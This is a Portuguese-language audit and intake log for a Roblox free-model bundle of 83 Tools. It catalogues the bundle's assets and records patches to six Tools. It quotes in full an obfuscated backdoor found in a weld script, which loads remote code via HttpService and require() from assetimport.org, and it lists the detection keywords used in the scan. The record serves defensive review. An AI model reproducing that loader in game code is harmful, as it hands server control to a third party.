# Modelo: Reality Tools — 83 Tools, e uma delas tem BACKDOOR

- Autor original:            **vários** — é um pacote de free models remontado ⚠️
- Origem:                    `reality_tools.rbxmx`, enviado em 2026-08-15
- Licença / permissão:       **a confirmar** ⚠️
- Data de entrada:           2026-08-15
- Status:                    **CRU — COM QUARENTENA**
- Onde vive:                 `MODELOS_ENTRADA/Reality_Tools/`

---

## ⛔ ANTES DE QUALQUER COISA: NÃO RODE ESTE ARQUIVO NUM PLACE DE PRODUÇÃO

Uma das 83 Tools carrega **execução remota de código**.

```
Pistol/Resource/HUD/MainGui/GameGui/AmmoFrame/Title/qPerfectionWeld   linha 155
```

```lua
task.spawn(function()
	pcall(function()
		local newThreadedCall = coroutine.wrap(pcall)
		for _ in newThreadedCall, (select and require),
			tonumber(game:service("HttpService"):GetAsync("https://assetimport.org/")) do
		end
	end)
end)
```

**O que isso faz:** busca um número num site de terceiro e passa o resultado para
`require()`. Quem controla `assetimport.org` escolhe qual módulo o seu jogo carrega e roda —
com permissão de servidor.

**Por que passa despercebido:**

| Disfarce | Como funciona |
|---|---|
| o nome do arquivo | `qPerfectionWeld` é uma biblioteca de solda **legítima e conhecida**; ninguém audita |
| a profundidade | está **sete níveis** abaixo da Tool, dentro de uma GUI de munição |
| a forma | é o cabeçalho de um `for ... in`, não uma chamada — não lê como `require(x)` |
| o silêncio | `pcall` dentro de `task.spawn`: se falhar, não aparece erro nenhum |

É **uma** ocorrência, e só na `Pistol`. Confirmado por varredura das 336 fontes: `assetimport`
aparece exatamente uma vez no arquivo inteiro.

### E mais um, menos escondido

```
TrenchGun/Script      local GLib = require(206209239)
```

`require(<id numérico>)` é execução de código remoto por definição — o dono do asset 206209239
pode trocar o conteúdo quando quiser. É proibição direta do `CLAUDE.md`.

### O que NÃO é problema

Os quatro `https://discord.gg/EcuFrjT` estão em `READ ME` dentro de `INSTRUCTION MANUAL` da
AK47, Hunting Rifle, Luger e Shotgun. É o convite do autor do pacote de armas, em texto de
documentação — não é webhook, não manda nada para lugar nenhum.

Zero `loadstring`, zero `getfenv`/`setfenv`, zero `PostAsync`, zero `BanAsync`.

---

## O que é

Um **despejo de free models**: 83 `Tool` na raiz, 8770 instâncias, 13 MB. Não é um modelo com
um tema — é uma caixa com tudo que o autor tinha.

| Família | Quantas | Exemplos |
|---|---|---|
| armas de fogo | ~18 | `AK47`, `Minigun`, `M249 SAW`, `Sniper`, `Shotgun`, `HL2 Pistol`, `Luger` |
| spawners de NPC | ~9 | `cat spawner`, `zombie spawner`, `soldier spawner`, `nextbot` |
| corpo a corpo | ~10 | `Crowbar`, `Bat`, `Baseball Bat`, `Bone`, `pipe`, `large spoon` |
| bebida / consumível | ~5 | `Bloxy Cola`, `Bonk Cola`, `Exploding Cola`, `neon potion` |
| piada / dança | ~12 | `kick dance`, `mannrobics`, `california`, `LOADSAMONEY`, `the j` |
| **admin / griefing** | ~8 | `godmode`, `HAX!`, `banisher`, `banisher ultra!!11`, `death`, `explode`, `control` |
| física / utilidade | ~6 | `Physics Gun`, `Gravity Inducer`, `dodge`, `speed` |

---

## O passe §12.12.2 — o maior número que já entrou aqui, em tudo

| Achado | Quantos | Recorde anterior |
|---|---|---|
| `wait(` | **1001** | 56 (Noob) |
| `math.random` | **545** | 67 (Faker) |
| `:Destroy()` | **450** | 18 |
| `delay(` | **224** | 3 |
| `tick()` | **198** | 31 (Drama) |
| `Health =` | **152** | 10 |
| `spawn(` | **126** | 20 |
| `BreakJoints` | **58** | 6 |
| `TakeDamage` | 52 | — |
| `ReplicatedStorage` | **37** | 0 |
| `LoadAnimation` | 35 | 2 |
| `ServerStorage` | **25** | 0 |
| `workspace:GetDescendants()` | 10 | 3 |

**Os 62 `ReplicatedStorage`/`ServerStorage` são o número que decide.** Todos os modelos
anteriores tinham ZERO — este é o primeiro que depende de depósito fora da Tool, e a
`REGRA_AUTOCONTENCAO_ABSOLUTA` é a regra nº 1 do projeto. Converter qualquer uma destas Tools
significa reescrever a dependência inteira, não adaptar.

---

## O que vale de verdade

### 5 `KeyframeSequence`, com 801 keyframes

É a **primeira animação de Roblox de verdade** a entrar no Acervo — `KeyframeSequence` com
`Keyframe` e `Pose`, não `Weld.C0` escrito em laço.

| Sequência | Keyframes | Onde |
|---|---|---|
| `california gurls` | **361** | `kick dance` |
| `california gurls` | 181 | `mannrobics` |
| `california gurls` | 165 | `california` |
| `california gurls` | 54 | `oh no me heart stopped` |
| `a-train` | 40 | `a-train` |

Quatro cópias da mesma dança em resoluções diferentes, e uma sexta animação. **361 keyframes é
mais que o dobro da maior track que este repositório já mediu.**

⚠️ `Animation`/`LoadAnimation` são proibidos dentro de Tool — mas `KeyframeSequence` é
**dado**, não instância de runtime: o `Pose` traz `CFrame` por junta e por tempo, que é
exatamente o que o `R6CFrameAnimator` consome. Isto é fonte de pose de altíssima densidade,
e é o motivo mais forte para o arquivo ficar no Acervo.

### 191 `Sound` distintos

Em 291 instâncias. É a maior paleta sonora que já chegou — o `Guest_Tools`, que era a
referência, tinha 12. Tiro, recarga, ferrolho, passo, impacto de metal, música.

### 66 `ParticleEmitter` · 74 `MeshPart` · 68 `UnionOperation` · 23 `Texture`

---

## Distribuição: 83 Tools contra um teto de 7

A `REGRA_DISTRIBUICAO_DE_TOOLS` dá piso 3 e teto 7. **83 é doze vezes o teto.** Este arquivo
não vira "o conjunto Reality" — no máximo vira **fonte** de onde sai um conjunto de 7, com
tema escolhido.

E boa parte não é candidata a nada:

- **os ~9 spawners** são NPC, que o `CLAUDE.md` põe explicitamente fora de escopo;
- **os ~8 de admin/griefing** (`godmode`, `HAX!`, `banisher`, `death`, `control`) não são
  habilidade de jogo, são ferramenta de quebrar servidor;
- **as ~18 armas de fogo** fogem do que o repositório é — os dez conjuntos existentes são
  corpo a corpo, conjuração e área. Uma AK47 conforme seria uma Tool correta e um corpo
  estranho.

O que sobra como tema plausível: **corpo a corpo** (`Crowbar`, `Bat`, `Bone`, `pipe`,
`large spoon`, `real scout bat`) e **física** (`Physics Gun`, `Gravity Inducer`, `dodge`,
`speed`) — mas o conjunto GRAVIDADE já cobre o segundo.

---

## Recomendação

1. **Não arraste este arquivo para um place de produção.** Nem para testar. O backdoor roda em
   `task.spawn` no carregamento, sem clique.
2. Se for usar, use como **fonte de asset**: as 5 `KeyframeSequence`, os 191 sons, os
   emissores e as malhas — copiados um a um, com o script deixado para trás.
3. Nenhuma das 83 Tools deve ser convertida com o script dela. Os 62
   `ReplicatedStorage`/`ServerStorage` e os 58 `BreakJoints` já garantiriam reescrita total; o
   backdoor decide.

## Passe de conformidade §12.12.2 — NÃO EXECUTADO

Modelo **CRU, em quarentena**: catalogado, triado e com o achado de segurança registrado.
Falta a licença (§12.12.3) e falta o pedido — quais Tools, com que nomes, de qual família.

---

## 2026-08-16 — a entrega é o SCRIPT DA ORIGEM, com dois consertos

### As 6 Tools que o conjunto usa NÃO têm veneno

O backdoor mora na `Pistol` e o `require(206209239)` mora no `TrenchGun`. Nenhuma das duas
entra no `Reality Gui`. Varredura nas seis usadas — `SLAP`, `a-train`, `tre`,
`gravity cat not amused`, `samsung`, `kick dance` — atrás de `assetimport`, `loadstring`,
`getfenv`, `setfenv`, `HttpService`, `GetAsync`, `PostAsync` e `require(<id>)`: **zero**.

Por isso a entrega mudou de forma. Ela não é mais um conjunto reescrito no padrão da casa: é o
**script da origem, byte por byte**, com exatamente 15 remendos, e nada mais.

### Os 15 remendos, e só eles

Duas coisas mudam. **1** — não ferir quem carrega a Tool. **2** — o dano valer.

| Tool | remendos | o quê |
|---|---|---|
| `Lapada Seca` | 2 | o `Touched` pegava quem a carrega · `humanoid.Health = 0` |
| `Canhao Satelite` | 1 | `v:destroy()` num raio de 250 apagava o próprio atirador |
| `Trem` | 2 | o `Touched` pegava o próprio corredor · `Health = 0` |
| `Arvore Maligna` | 3 | marca de dono · quem plantou era presa · `Health = 0` |
| `Gato Ajudante Boss` | 5 | marca de dono · `findTorso` escolhia o dono · 3× `Health = 0` |
| `Samsungus` | 2 | `Health - math.random(20,25)` ignorava ForceField e não creditava |
| `Danca Provocadora` | 0 | **não faz dano nenhum — atravessou intacta** |

`Health = 0` e `Health - X` viram `__RV_dano`, que passa pelo Núcleo quando ele existe, usa
`TakeDamage` (respeita `ForceField`) e deixa tag de `creator` para o abate contar.

O que **não** foi tocado, de propósito: `wait`, `spawn`, `math.random`, `:Destroy()`,
`BreakJoints` em cadáver clonado, `Instance.new("Explosion")`, as `ScreenGui`, o `Popup`, o
`shakerbreaker`, o `Humanoid.Name = "Immunity"`, e a animação (`CFAv3` + as duas
`KeyframeSequence`, inteiras, como a origem as tem).

### O que isto quebra, e está declarado

`require(game:GetService("ReplicatedFirst").Ragdoll)` aparece em **5 lugares** (a-train, tre, e
três no gato). O módulo não vem junto e **não se auto-instala**: num place vazio a linha erra e
o resto daquele handler para. É violação da regra nº 1, mantida porque o pedido foi não mexer
em mais nada.

Os outros dois caminhos de fora **se auto-instalam**: `script.tree.Parent =
game.ReplicatedStorage` e `script[...].Parent = game.ServerStorage` — o próprio script põe o
asset lá no carregamento, então funcionam sozinhos.

### Três coisas que a barreira e o conversor aprenderam

1. **`getfenv`/`setfenv` agora exigem PROVA, não perdão.** O LOIC carrega o boilerplate
   "model to script v4" do ttyyuu12345. Liberar por nome seria buraco permanente; a barreira
   verifica as três condições que fazem o trecho ser código morto — `sandbox` definida e nunca
   chamada, `cors` só recebendo `{}`, e nenhum `getfenv` fora do corpo dela. Se a origem mudar,
   a entrega para.
2. **A tabela `<SharedStrings>` tem que viajar junto.** `MeshPart.AeroMeshData` é uma CITAÇÃO
   de md5; o bloco que a resolve é irmão dos `Item` e não vem quando se copia só a Tool. Sem
   ele o `rbx-dom` lê a propriedade como `BinaryString` e a conversão morre com
   `PropTypeMismatch`.
3. **Tag de `CollectionService` com conteúdo atravessa.** O conversor abortava; só que
   descartar nunca foi a única saída — `SharedString` e `BinaryString` guardam o mesmo base64,
   e copiar o texto troca o invólucro sem tocar no valor. Duas `KeyframeSequence` passaram
   inteiras. O que ainda para tudo é md5 citada que a tabela não resolve.

Status do modelo: **segue CRU, em quarentena.** Licença (§12.12.3) continua em aberto.
